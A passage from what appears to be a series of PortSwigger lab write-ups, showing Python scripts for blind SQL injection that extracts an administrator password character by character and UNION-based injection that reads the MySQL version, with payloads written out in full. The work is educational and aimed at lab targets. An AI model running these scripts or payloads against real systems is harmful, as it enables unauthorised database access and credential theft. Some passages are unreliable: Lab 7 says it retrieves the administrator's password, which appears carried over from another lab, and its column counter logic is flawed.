this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: Proxies \u0026amp; URL:\nWe declare an array of proxies to proxy our requests through as well as the unique url \u0026amp; category endpoint.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a3c006504052939809e08460073005d.web-security-academy.net/\u0026#34; Empty String:\nWe just need a single empty string to store the revealed password as we uncover each value.\nrevealedPass=\u0026#34;\u0026#34; Main Logic: We declare a loop that will run for 21 iterations.\nfor substringPosition in range(21): +Note+: SQL substring counting position starts at 1, however with programming we start counting from 0. This means if we were to set the counter to 20 we would not get all the characters of the password.\nThen we have a try block which will be used to contain the rest of our logic.\nWe open our payloads.txt file and read mode.\nwith open(\u0026#34;payload.txt\u0026#34;, \u0026#39;r\u0026#39;) as payloads: We then iterate through this file, line by line.\nfor x in payloads: We create a variable called passwordChar which is used to store the current value from our payload.txt file minus the new character symbol at the end of each line.\npasswordChar=(x.rstrip(\u0026#39;\\n\u0026#39;)) We create a payload string where we pass in the payload previous used + our substringPosition (where we are in the iterations from 0-21) as well as the passwordChar from our payload.txt file.\npayload=f\u0026#34;\u0026#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = \u0026#39;administrator\u0026#39;), {substringPosition}, 1) = \u0026#39;{passwordChar}\u0026#39;--\u0026#34; We then send our request which contains the cookies TrackingId + our payload \u0026amp; the Session cookie.\nrequest=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={ \u0026#39;TrackingId\u0026#39; : \u0026#39;wHKbJUKVNyNQ3KcI\u0026#39;+payload, \u0026#39;session\u0026#39; : \u0026#39;svmX1XmGGA5zDIliHs2vgR5inf98jIVz\u0026#39; }) Response Monitoring: We then monitor the responses and if the value \u0026ldquo;welcome back!\u0026rdquo; is found in the body of the response we will:\nAdd the passwordChar value to our empty list revealedPass We will print the string \u0026quot;Password char position {substringPosition} == {passwordChar}.\u0026quot; We will then print the current contents of the revealedPass string. +Note+: I had to use the .lower() method for this to work. if \u0026#39;welcome back!\u0026#39; in request.text.lower(): revealedPass+=passwordChar print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;Password char position {substringPosition} == {passwordChar}.\u0026#34;) print(revealedPass) Full chunk:\nfor substringPosition in range(21): try: with open(\u0026#34;payload.txt\u0026#34;, \u0026#39;r\u0026#39;) as payloads: for x in payloads: passwordChar=(x.rstrip(\u0026#39;\\n\u0026#39;)) payload=f\u0026#34;\u0026#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = \u0026#39;administrator\u0026#39;), {substringPosition}, 1) = \u0026#39;{passwordChar}\u0026#39;--\u0026#34; request=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={ \u0026#39;TrackingId\u0026#39; : \u0026#39;wHKbJUKVNyNQ3KcI\u0026#39;+payload, \u0026#39;session\u0026#39; : \u0026#39;svmX1XmGGA5zDIliHs2vgR5inf98jIVz\u0026#39; }) if \u0026#39;welcome back!\u0026#39; in request.text.lower(): revealedPass+=passwordChar print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;Password char position {substringPosition} == {passwordChar}.\u0026#34;) print(revealedPass) Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a3c006504052939809e08460073005d.web-security-academy.net/\u0026#34; revealedPass=\u0026#34;\u0026#34; for substringPosition in range(21): try: with open(\u0026#34;payload.txt\u0026#34;, \u0026#39;r\u0026#39;) as payloads: for x in payloads: passwordChar=(x.rstrip(\u0026#39;\\n\u0026#39;)) payload=f\u0026#34;\u0026#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = \u0026#39;administrator\u0026#39;), {substringPosition}, 1) = \u0026#39;{passwordChar}\u0026#39;--\u0026#34; request=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={ \u0026#39;TrackingId\u0026#39; : \u0026#39;wHKbJUKVNyNQ3KcI\u0026#39;+payload, \u0026#39;session\u0026#39; : \u0026#39;svmX1XmGGA5zDIliHs2vgR5inf98jIVz\u0026#39; }) if \u0026#39;welcome back!\u0026#39; in request.text.lower(): revealedPass+=passwordChar print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;Password char position {substringPosition} == {passwordChar}.\u0026#34;) print(revealedPass) except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Solving The Lab: If we run the script we can see it prints the password out character by character. And we can ensure this is correct by logging in and solving the lab. ",

        "title": "SQLi Vulnerabilities: Lab 7: SQL injection attack, querying the database type and version on MySQL and Microsoft",
        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","portswigger-labs","ctf-writeup","injection","sql","sqli","python","UNION",],
        "content": "Lab 7: SQL injection attack, querying the database type and version on MySQL and Microsoft: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\nTo solve the lab, display the database version string.\nInitial Reconnaissance/Discovery: We are given access to a simple web application which allows us to filter categories of products using the filters on the page, there is also a \u0026ldquo;Home\u0026rdquo; button.\nWe already know the \u0026ldquo;category\u0026rdquo; parameter is vulnerable based on the previous lab however let\u0026rsquo;s re-verify this. +Note+: We can also see the string it wants us to display, this is useful as we can already infer it\u0026rsquo;s not running MSSQL but instead MySQL as the host is ubuntu \u0026amp; we can use this partial string to help with our python scripting later.\nEstablishing SQLi: If we send request to repeater we can inject a single quote ' after the parameter and see we trigger a 500 response. If then add a single another quote we can see that the page returns a 200 OK response. Inferring The SQL Query Being Run: Looking at the way the page we returns information can infer the query being run is similar to the below.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39; AND [rest of query] When we add our single quote it becomes the below which is syntactically incorrect.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39; AND [rest of query] However when we add another quote it becomes the below, closing off the first quotation mark we provided.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39;\u0026#39; AND [rest of query] UNION SELECT Requirements: As the lab wants us to display data we will need a way to output that data and the simplest way to retrieve data would be using a UNION SELECT query. This will allow us to display the output of our query\u0026rsquo;s amongst the legitimate data. However in order for us to do this we need to ensure that the two requirements for this attack are met:\nThe queries must return the same amount of columns: This means that if the original query that is searching the database returns 5 columns our UNION query must also return 5 columns.\nTo solve this issue: We will enumerate the number of columns being returned by the original query. The data types in the columns must be compatible with each query: This means that if the table is returning strings such as item names in column 1 our UNION query has to also return strings or a compatible data type.\nTo solve this issue: Initially we will use a simple method of returning NULL values. This is because NULL is convertible/compatible to every data type, so it will mean that the payload should succeed. Once we have established our column count we will then start enumerating the data type of the columns \u0026amp; eventually extract data. Establishing The Number Of Columns Using UNION SELECT Statement: Using Burp: In order for us to display data we need to establish how many columns are in the existing database.\nIf we return back to repeater we can enter the payload.\n\u0026#39; UNION SELECT NULL-- We then select the payload \u0026amp; press CTRL+U to URL encode it, however this won\u0026rsquo;t work. The reason being is that this is database is running MySQL and MySQL comments +require+ a space after the comment symbol. So we need to add an additional space so by using a + symbol or we can just use the # symbol instead. If we send this payload we get a 500 response meaning the number of columns is not correct, so add another NULL so our payload and repeat the process.\n\u0026#39; UNION SELECT NULL,NULL-- This time we get a 200 response telling us there are 2 columns in the table. Using Python: As usual I am going to show how this can also be solved using Python.\nPrep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: Proxies \u0026amp; URL:\nWe declare an array of proxies to proxy our requests through as well as the unique url \u0026amp; category endpoint. +Note+: The category and URL vary from instance to instance.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0aa9007a0350e042804fee0b002f0021.web-security-academy.net/filter?category=Gifts\u0026#34; SQL Syntax \u0026amp; Counters:\nSo now we have our payload broken up into various elements, the reason for this is because we don\u0026rsquo;t want to just supply a list of multiple UNION SELECT statements, doing it this way offers more flexibility as well as ensuring we don\u0026rsquo;t repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn\u0026rsquo;t advise that but you could)\nunion=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;-- \u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 We also create a counter variable and set it to 2. This counter is used to track how many NULL values (columns) are in our UNION SELECT payload as we build it. Our starting payload is:\npayload = union + nullPayload # \u0026#34;\u0026#39; UNION SELECT NULL\u0026#34; So before the loop runs we already have one NULL in the query. Inside the loop, we keep appending more ,NULL values to payload and update counter to reflect the number of columns.\nWe don’t start the counter at 0 because SQL columns are conceptually counted from 1 (first column, second column etc…) and our payload already includes the first NULL column. If we started from 0, the value of counter would always lag behind the actual number of NULL columns in the query. By starting at 2, the value of counter stays aligned with the true column count once we begin adding additional NULL values in the loop.\nFor Loop With Request: We declare a for loop will which repeat for 10 total iterations.\nThen we have a try block which will send our get request to the url with payload \u0026amp; comment.\nResponse Monitoring: We then monitor the responses and if the value \u0026ldquo;Home\u0026rdquo; is found in the body of the response we will:\nPrint the string \u0026quot;Valid payload {payload}-- there are {counter} columns.\u0026quot; which will contain the actual payload as well as the number of columns. Print the full Lab URL including comment and payload so we can easily verify it in a browser. If these above conditions are met it will break out of the loop and stop the process.\nIf the above is not found it will add an additional NULL value using the additionalNull variable to the payload \u0026amp; increment the counter by 1 and continue.\nfor i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) break payload=payload+additionalNull counter+=i Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os import urllib.parse requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a5e008204fb807d80bf7bf20046003e.web-security-academy.net/filter?category=Pets\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;-- \u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Running The Script: As we can see it tells what we expect, there are 2 columns and the correction payload is:\n\u0026#39; UNION SELECT NULL,NULL-- Establishing Column Data Type VIA UNION SELECT Statement: Using Burp: Much like how we established the number of columns we can use repeater to determine the column data type.\nWe know to pass the lab we need to extract the administrators username \u0026amp; password in a single column, then login. Typically usernames and passwords would be a string data type in the database. So to enumerate this we will systematically start replacing the NULL values of our payload with the string values 'a'. This means our payload becomes:\n\u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,NULL-- \u0026#39;+UNION+SELECT+NULL,\u0026#39;a\u0026#39;-- \u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,\u0026#39;a\u0026#39;-- As we can the first column is compatible with the string datatype as we get a 200 response. We now modify our payload so the string value is in the second NULL position and revert the first position to be NULL again.\n\u0026#39;+UNION+SELECT+NULL,\u0026#39;a\u0026#39;-- We can see this worked and the second position is also compatible with the string datatype. Using Python: We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we have added.\n+compatible=0 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) + payloadList=[nullPayload] * counter + for y in range(len(payloadList)): + if payloadList[y] == \u0026#34;NULL\u0026#34;: + payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; + newPayload=(\u0026#34;,\u0026#34;.join(payloadList)) + request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) + if \u0026#39;Home\u0026#39; in request.text: + print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) + compatible+=1 + if compatible \u0026gt; 1: + print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) + payloadList[y] = \u0026#34;NULL\u0026#34; payload=payload+additionalNull counter+=i Compatible Variable: This is going to be used later on to print out a specific message if we find more than 1 compatible data type column so at the moment we set this with a value of 0.\ncompatible=0 List Creation: We then create a payloadList that\u0026rsquo;s contents is the value of nullPayload (which is \u0026ldquo;NULL\u0026rdquo;) and this is equal to the value of the counter so if the counter is 2 then the list value is ['NULL', 'NULL']\npayloadList=[nullPayload] * counter List Iteration:\nif payloadList[y] == \u0026#34;NULL\u0026#34;: payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; We now iterate through the length of the list and if the value of y in the list is equal to NULL (which it will be) we replace that with the with a string called string. So on the first run it would ['string', NULL].\nNew Payload Creation:\nnewPayload=(\u0026#34;,\u0026#34;.join(payloadList)) We then join our list together into a string so we can pass this to our request later, and we ensure we separate with a comma , other wise our payload would be \u0026quot;'string'NULLNULL\u0026quot;\nSend our Request:\nrequest=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) Next we send our request like before but this time we are using our new payload. We also need to ensure we send the \u0026quot;union\u0026quot; variable as this is not currently present in our list/string/payloadstring.\nWe also perform the same type of check in the body of the request for the string \u0026ldquo;Home\u0026rdquo; which will signify that we have had a 200 OK response, and in this event it will print out the payload.\nCompatible Logic Counter: If the above conditions are met we increment our compatible counter by 1. We then perform a check if the counter is greater than 1 and if it is we print out the total number of compatible data types found and suggest the user combine the payloads.\ncompatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) Reset The NULL Value:\npayloadList[y] = \u0026#34;NULL\u0026#34; In the event that we do not get a 200 response we rest the list position y to be NULL again as other wise the list would just be full of the lab string.\nAs we can see when we run the script it prints out the compatible data type fields in position 1 \u0026amp; 2 and also suggests we combine the payloads as they are both valid. Extracting The Database Version By Using A UNION SELECT Statement: We can easily query the database version using the correct the below query.\n\u0026#39; UNION SELECT NULL,@@version-- Using Burp: Let\u0026rsquo;s use the above query in burpsuite to extract the database version.\nWe can see this works and the version is displayed. If we visit the page we can see the lab is solved. Using Python: We can also use python to extract the database version directly too.\nAdditional Import: For us to parse and extract the database version we need the BeautifulSoup library and as we will be using regular expressions we need the re library.\nfrom bs4 import BeautifulSoup import re def extractSQLVersion(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT NULL,@@version-- \u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;Home\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) SQLVersion = soup.find(\u0026#39;td\u0026#39;, string=re.compile(r\u0026#39;^8\\.0\\.42\u0026#39;)) print(f\u0026#34;The SQLVersion is: {SQLVersion}\u0026#34;) return True return False Function definition \u0026amp; payload First we define the function called extractSQLVersion we then declare our sqlPayload.\ndef extractSQLVersion(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT NULL,@@version-- \u0026#34; Send a request \u0026amp; store the response: We send our payload and store the response in a variable called response.\nrequest=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text Parse response:\nif \u0026#34;Home\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) SQLVersion = soup.find(\u0026#39;td\u0026#39;, string=re.compile(r\u0026#39;^8\\.0\\.42\u0026#39;)) print(f\u0026#34;The SQLVersion is: {SQLVersion}\u0026#34;) return True return False If we find the string \u0026ldquo;home\u0026rdquo; in the response this tells us the table of users has been returned.\nWe pass the HTML body from the HTTP response into beautiful soups HTML parser so it can turn the raw HTML into a structured object we can search through.\nWe then search through this HTML, namely within the td tags for the regular expression string \u0026quot;^8\\.0\\.42\u0026quot; (the version number). We search within the td as this is where the string is stored. Call the Function: We now call the function so it runs after our other conditions are satisfied.\nif \u0026#39;Home\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 + if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) + extractSQLVersion() payloadList[y] = \u0026#34;NULL\u0026#34; As we can see it works when we run it and we are given the administrators password. Whole Script: #!/usr/bin/env python3 import requests import os import urllib.parse requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) from bs4 import BeautifulSoup import re proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a9200ae04e705ff80121ceb00cf0094.web-security-academy.net/filter?category=Lifestyle\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;-- \u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 compatible=0 def extractSQLVersion(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT NULL,@@version-- \u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;Home\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) SQLVersion = soup.find(\u0026#39;td\u0026#39;, string=re.compile(r\u0026#39;^8\\.0\\.42\u0026#39;)) print(f\u0026#34;The SQLVersion is: {SQLVersion}\u0026#34;) return True return False for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) payloadList=[nullPayload] * counter for y in range(len(payloadList)): if payloadList[y] == \u0026#34;NULL\u0026#34;: payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; newPayload=(\u0026#34;,\u0026#34;.join(payloadList)) request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) extractSQLVersion() payloadList[y] = \u0026#34;NULL\u0026#34; payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) ",
